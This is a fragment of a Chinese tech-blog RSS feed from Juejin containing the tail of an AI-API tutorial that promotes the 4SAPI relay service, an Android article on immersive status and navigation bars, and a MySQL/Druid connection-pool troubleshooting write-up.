        <span class="hljs-built_in">print</span>(<span class="hljs-string">"-"</span> * <span class="hljs-number">30</span>)
        
        <span class="hljs-comment"># 打印一下消耗的 Token 数（4SAPI 后台也能看到详细日志）</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Token 消耗: <span class="hljs-subst">{response.usage.total_tokens}</span>"</span>)

    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"❌ 调用失败: <span class="hljs-subst">{e}</span>"</span>)

<span class="hljs-comment"># 执行函数</span>
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    call_ai_model()
</code></pre>
<h3 data-id="heading-6">四、 常见报错与排查 (Troubleshooting)</h3>
<p>在调试 API 时，报错是家常便饭。以下是三种最常见的错误代码及其含义：</p>
<ol>
<li>
<p><strong>401 Unauthorized</strong></p>
<ul>
<li><strong>含义</strong>：身份验证失败。</li>
<li><strong>解决</strong>：检查 <code>api_key</code> 是否填错，或者是否有多余的空格。</li>
</ul>
</li>
<li>
<p><strong>429 Too Many Requests</strong></p>
<ul>
<li><strong>含义</strong>：请求太快，或者额度耗尽。</li>
<li><strong>解决</strong>：如果你用的是官方免费号，很容易触发这个。建议切换到 <strong>4SAPI</strong> 这样的企业级中转，由于其底层采用了 MySQL 8.2 高并发架构，能承载极高的并发量，几乎不会遇到误报的 429 错误。</li>
</ul>
</li>
<li>
<p><strong>Connection Timeout / APIConnectionError</strong></p>
<ul>
<li><strong>含义</strong>：连不上服务器。</li>
<li><strong>解决</strong>：这是国内开发者最头疼的问题。通常是因为网络墙的原因。解决办法就是修改代码中的 <code>base_url</code>，指向一个国内访问友好的中转节点（如代码中演示的 <code>api.4sapi.com</code>）。</li>
</ul>
</li>
</ol>
<h3 data-id="heading-7">五、 进阶：如何像高手一样使用“流式输出”？</h3>
<p>你注意过 ChatGPT 网页版是一个字一个字蹦出来的吗？这叫 <strong>Streaming（流式）</strong> 。</p>
<p>在 API 中实现这个功能非常简单，只需要改两个地方：</p>
<p>Python</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 1. 将 stream 设置为 True</span>
<span class="hljs-attr">response</span> = client.chat.completions.create(
    <span class="hljs-attr">model</span>=<span class="hljs-string">"gpt-4"</span>,
    <span class="hljs-attr">messages</span>=[...],
    <span class="hljs-attr">stream</span>=<span class="hljs-literal">True</span>  <span class="hljs-comment"># &lt;--- 修改这里</span>
)

<span class="hljs-comment"># 2. 循环处理生成器</span>
print("AI 回复: ", <span class="hljs-attr">end</span>=<span class="hljs-string">""</span>)
for chunk in response:
    if chunk.choices<span class="hljs-section">[0]</span>.delta.content:
        <span class="hljs-comment"># 即时打印每一个片段</span>
        print(chunk.choices<span class="hljs-section">[0]</span>.delta.content, <span class="hljs-attr">end</span>=<span class="hljs-string">""</span>, flush=<span class="hljs-literal">True</span>)
</code></pre>
<p><strong>提示</strong>：流式输出对网络稳定性要求极高。如果中间丢包，字就会断。这也是为什么生产环境推荐使用 <strong>4SAPI</strong> 的原因——其物理线路紧邻上游核心节点，能保证长连接不断开，让“打字机效果”丝般顺滑。</p>
<h3 data-id="heading-8">结语</h3>
<p>恭喜你！到这里，你已经完成了一次标准的 API 调用。</p>
<p>你会发现，代码的核心逻辑其实非常固定。真正的难点往往在于<strong>网络环境配置</strong>和<strong>账号维护</strong>。对于初学者和企业开发者，选择一个配置简单、兼容性好的基础设施（如文中演示的 4SAPI），能帮你节省 90% 的调试时间，让你专注于编写业务逻辑，而不是去修网络连接。</p>
<p>现在，去运行代码，开启你的 AI 开发之旅吧！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[关于沉浸式状态栏和导航栏适配问题]]></title>    <link>https://juejin.cn/post/7602162809292570662</link>    <guid>https://juejin.cn/post/7602162809292570662</guid>    <pubDate>2026-02-03T03:11:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602162809292570662" data-draft-id="7602252722372378675" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="关于沉浸式状态栏和导航栏适配问题"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-02-03T03:11:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Z_Quintaz"/> <meta itemprop="url" content="https://juejin.cn/user/4300945219391063"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            关于沉浸式状态栏和导航栏适配问题
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4300945219391063/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Z_Quintaz
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T03:11:51.000Z" title="Tue Feb 03 2026 03:11:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">WindowCompact</h2>
<p>windowCompact有三个方法</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 是否将内容布局超出状态栏</span>
WindowCompat.setDecorFitsSystemWindows(Window, <span class="hljs-built_in">Boolean</span>)

<span class="hljs-comment">// 获取Insets控制器</span>
WindowCompat.getInsetsController(Window, View)

<span class="hljs-comment">// 是否能够将画面超出系统栏</span>
WindowCompat.enableEdgeToEdge(Window)
</code></pre>
<p>沉浸式状态栏实现</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> Window.<span class="hljs-title">setTransparentStatusBar</span><span class="hljs-params">(isLight: <span class="hljs-type">Boolean</span>)</span></span> {
    WindowCompat.setDecorFitsSystemWindows(<span class="hljs-keyword">this</span>, <span class="hljs-literal">false</span>)

    statusBarColor = Color.TRANSPARENT

    WindowCompat.getInsetsController(<span class="hljs-keyword">this</span>, <span class="hljs-keyword">this</span>.decorView).apply {
        isAppearanceLightStatusBars = isLight
    }
}
</code></pre>
<p>处理内容的偏移</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> View.<span class="hljs-title">handleContentPadding</span><span class="hljs-params">()</span></span> {
    ViewCompat.setOnApplyWindowInsetsListener(<span class="hljs-keyword">this</span>) { v, insets -&gt;
        <span class="hljs-keyword">val</span> systemWindow = insets.getInsets(
            WindowInsetsCompat.Type.systemBars() or
                    WindowInsetsCompat.Type.displayCutout())

        <span class="hljs-comment">//为需要偏移的view设置padding</span>
        v.setPadding(<span class="hljs-number">0</span>,systemWindow.top,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)

        insets
    }
}
</code></pre>
<p>其中WindowInsetsCompat.Type 参数解释：</p>
<pre><code class="hljs language-kotlin" lang="kotlin">WindowInsetsCompat.Type.ime()<span class="hljs-comment">//键盘</span>
WindowInsetsCompat.Type.displayCutout()<span class="hljs-comment">//刘海屏</span>
WindowInsetsCompat.Type.statusBars()<span class="hljs-comment">//状态栏</span>
WindowInsetsCompat.Type.navigationBars()<span class="hljs-comment">//导航栏</span>
WindowInsetsCompat.Type.captionBar()<span class="hljs-comment">//标题栏</span>
WindowInsetsCompat.Type.systemBars()<span class="hljs-comment">//状态栏,导航栏和标题栏</span>
WindowInsetsCompat.Type.systemGestures()<span class="hljs-comment">//系统手势</span>
WindowInsetsCompat.Type.mandatorySystemGestures()<span class="hljs-comment">//强制性系统手势</span>
WindowInsetsCompat.Type.tappableElement()<span class="hljs-comment">//可点击区域</span>
</code></pre>
<h3 data-id="heading-1">顺带一提</h3>
<p>看了下安卓新建项目时出现的方法，谷歌帮我们做了一些对系统栏的处理</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> ComponentActivity.<span class="hljs-title">enableEdgeToEdge</span><span class="hljs-params">(
    statusBarStyle: <span class="hljs-type">SystemBarStyle</span> = SystemBarStyle.auto(Color.TRANSPARENT, Color.TRANSPARENT)</span></span>,
    navigationBarStyle: SystemBarStyle = SystemBarStyle.auto(DefaultLightScrim, DefaultDarkScrim),
) {
    <span class="hljs-keyword">val</span> view = window.decorView
    <span class="hljs-keyword">val</span> statusBarIsDark = statusBarStyle.detectDarkMode(view.resources)
    <span class="hljs-keyword">val</span> navigationBarIsDark = navigationBarStyle.detectDarkMode(view.resources)
    <span class="hljs-keyword">val</span> impl =
        Impl
            ?: (<span class="hljs-keyword">if</span> (Build.VERSION.SDK_INT &gt;= <span class="hljs-number">35</span>) {
                    EdgeToEdgeApi35()
                } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Build.VERSION.SDK_INT &gt;= <span class="hljs-number">30</span>) {
                    EdgeToEdgeApi30()
                } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Build.VERSION.SDK_INT &gt;= <span class="hljs-number">29</span>) {
                    EdgeToEdgeApi29()
                } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Build.VERSION.SDK_INT &gt;= <span class="hljs-number">28</span>) {
                    EdgeToEdgeApi28()
                } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Build.VERSION.SDK_INT &gt;= <span class="hljs-number">26</span>) {
                    EdgeToEdgeApi26()
                } <span class="hljs-keyword">else</span> {
                    EdgeToEdgeApi23()
                })
                .also { Impl = it }
    impl.setUp(
        statusBarStyle,
        navigationBarStyle,
        window,
        view,
        statusBarIsDark,
        navigationBarIsDark,
    )
    impl.adjustLayoutInDisplayCutoutMode(window)
}
</code></pre>
<p>其中包含了沉浸状态栏，同时根据系统主题处理了状态栏的亮暗关系。所以可以直接使用这个方法。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(savedInstanceState: <span class="hljs-type">Bundle</span>?)</span></span> {
    <span class="hljs-keyword">super</span>.onCreate(savedInstanceState)

    enableEdgeToEdge()

    setContentView(R.layout.activity_main)
}
</code></pre>
<p>这样做之后可以保证我们的内容可以充满整个屏幕，至于说边距问题，直接添加padding就可以了。完整如下</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> : <span class="hljs-type">AppCompatActivity</span>() {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">lateinit</span> <span class="hljs-keyword">var</span> mBinding: ActivityMainBinding

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(savedInstanceState: <span class="hljs-type">Bundle</span>?)</span></span> {
        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState)

        enableEdgeToEdge()

        mBinding = DataBindingUtil.setContentView(<span class="hljs-keyword">this</span>, R.layout.activity_main)

        window.decorView.setPadding(
            window.decorView.paddingLeft,
            window.decorView.paddingTop,
            window.decorView.paddingRight,
            <span class="hljs-comment">// 对导航栏进行padding</span>
            window.decorView.paddingBottom + BarUtils.getNavBarHeight()
        )
    }

}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[26分钟就断连？一次 MySQL “幽灵掉线” 的深度破局之路]]></title>    <link>https://juejin.cn/post/7602158221851754511</link>    <guid>https://juejin.cn/post/7602158221851754511</guid>    <pubDate>2026-02-03T03:29:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602158221851754511" data-draft-id="7602158221851721743" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="26分钟就断连？一次 MySQL “幽灵掉线” 的深度破局之路"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-02-03T03:29:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="码途山海"/> <meta itemprop="url" content="https://juejin.cn/user/1143959165085032"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            26分钟就断连？一次 MySQL “幽灵掉线” 的深度破局之路
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1143959165085032/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    码途山海
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T03:29:22.000Z" title="Tue Feb 03 2026 03:29:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><strong>问题现象</strong>：系统在空闲一段时间后，首次访问数据库时报错 <code>Communications link failure</code>，错误日志显示“Last packet received was 1,594,079 milliseconds ago（约26分钟）”。即使配置了连接池验证，问题依然反复出现。</p>
</blockquote>
<p>本文将完整复盘该问题的<strong>排查思路、踩过的坑、最终解决方案</strong>，并详解 Druid 连接池关键参数配置，帮助大家避免重蹈覆辙。</p>
<hr/>
<h2 data-id="heading-0"> 一、问题初现：不只是“超时”那么简单</h2>
<p>最初，我们看到典型的 MySQL 通信异常：</p>
<pre><code class="hljs language-csharp" lang="csharp">Caused <span class="hljs-keyword">by</span>: com.mysql.cj.exceptions.CJCommunicationsException: Communications link failure
The last packet successfully received <span class="hljs-keyword">from</span> the server was <span class="hljs-number">1</span>,<span class="hljs-number">594</span>,<span class="hljs-number">079</span> milliseconds ago.
</code></pre>
<p>直觉告诉我们：<strong>数据库连接被断开了</strong>。<br/>
于是我们检查了 MySQL 的 <code>wait_timeout</code> 和 <code>interactive_timeout</code>，发现均为 <code>7200</code> 秒（2小时）——远大于 26 分钟。</p>
<p><strong>结论</strong>：不是 MySQL 主动断连，而是<strong>中间网络设备（如云厂商 SLB、NAT 网关、防火墙）在空闲约 15–30 分钟后切断了 TCP 连接</strong>。</p>
<hr/>
<h2 data-id="heading-1">二、第一次尝试：配置连接池验证</h2>
<p>我们立即为 Druid 连接池添加了基础防护：</p>
<pre><code class="hljs language-vbnet" lang="vbnet">test-<span class="hljs-keyword">on</span>-borrow: <span class="hljs-literal">true</span>
validation-query: <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span> <span class="hljs-keyword">FROM</span> DUAL
min-evictable-idle-time-millis: <span class="hljs-number">300000</span>  # <span class="hljs-number">5</span>分钟
test-<span class="hljs-keyword">while</span>-idle: <span class="hljs-literal">true</span>
</code></pre>
<p><strong>预期效果</strong>：每次借出连接前先验证，确保连接有效。</p>
<p><strong>结果</strong>：问题依旧！更诡异的是，日志中开始频繁出现：</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-keyword">ERROR</span> druid.sql.Statement - execute <span class="hljs-keyword">error</span>. <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span> <span class="hljs-keyword">FROM</span> DUAL
</code></pre>
<p>这说明：<strong>Druid 确实在验证连接，但验证本身失败了</strong>——连接已被网络中断。</p>
<hr/>
<h2 data-id="heading-2">三、深入排查：为什么验证失败还会报业务错误？</h2>
<p>通过分析 Druid 源码和日志，我们发现：</p>
<ul>
<li>• 虽然 <code>test-on-borrow=true</code> 能检测到坏连接，</li>
<li>• 但<strong>默认情况下，验证失败会直接抛出异常</strong>，不会自动重试！</li>
</ul>
<p>这意味着：用户请求会直接失败，体验极差。</p>
<p><strong>关键突破</strong>：启用 Druid 的 <strong>异常分类器（Exception Sorter）</strong> ，让连接池能识别“可恢复的网络异常”，并自动重试获取新连接。</p>
<hr/>
<h2 data-id="heading-3">四、最终解决方案：三重防护体系</h2>
<h3 data-id="heading-4">1、启用 MySQL 异常分类器（核心！）</h3>
<p>在 <code>connection-properties</code> 中显式指定：</p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">connection-properties:</span>
  druid.exceptionSorter: com.alibaba.druid.pool.vendor.MySqlExceptionSorter
</code></pre>
<blockquote>
<p>✅ 作用：当 <code>SELECT 1</code> 验证失败时，Druid 会识别这是“网络断连”而非 SQL 错误，自动 discard 坏连接，并<strong>重试获取新连接</strong>，对业务透明。</p>
</blockquote>
<hr/>
<h3 data-id="heading-5">2、合理设置空闲回收时间</h3>
<p>根据网络设备超时（约 26 分钟），我们将空闲时间设为 <strong>10–15 分钟</strong>，留足安全余量：</p>
<pre><code class="hljs language-perl" lang="perl">min-evictable-idle-<span class="hljs-keyword">time</span>-millis: <span class="hljs-number">600000</span>   <span class="hljs-comment"># 10分钟</span>
max-evictable-idle-<span class="hljs-keyword">time</span>-millis: <span class="hljs-number">900000</span>   <span class="hljs-comment"># 15分钟</span>
<span class="hljs-keyword">time</span>-between-eviction-runs-millis: <span class="hljs-number">30000</span> <span class="hljs-comment"># 每30秒检查一次</span>
</code></pre>
<blockquote>
<p>✅ 作用：在连接被网络中断前，主动回收，大幅降低验证失败概率。</p>
</blockquote>
<hr/>
<h3 data-id="heading-6">3、关闭生产环境的 <code>removeAbandoned</code>（重要！）</h3>
<p>初期我们启用了：</p>
<pre><code class="hljs language-arduino" lang="arduino">remove-abandoned: <span class="hljs-literal">true</span>
remove-abandoned-timeout-millis: <span class="hljs-number">180000</span> # <span class="hljs-number">3</span>分钟
</code></pre>
<p>但 Druid 日志警告：</p>
<pre><code class="hljs language-csharp" lang="csharp">WARN - removeAbandoned <span class="hljs-keyword">is</span> <span class="hljs-literal">true</span>, <span class="hljs-keyword">not</span> use <span class="hljs-keyword">in</span> production.
</code></pre>
<p><strong>原因</strong>：它可能误杀真正的长事务（如耗时 5 分钟的报表导出），导致 <code>Communications link failure</code>。</p>
<blockquote>
<p>✅ <strong>生产环境必须关闭</strong>，改用良好编码规范（如 Spring 事务、try-with-resources）防止泄漏。</p>
</blockquote>
<hr/>
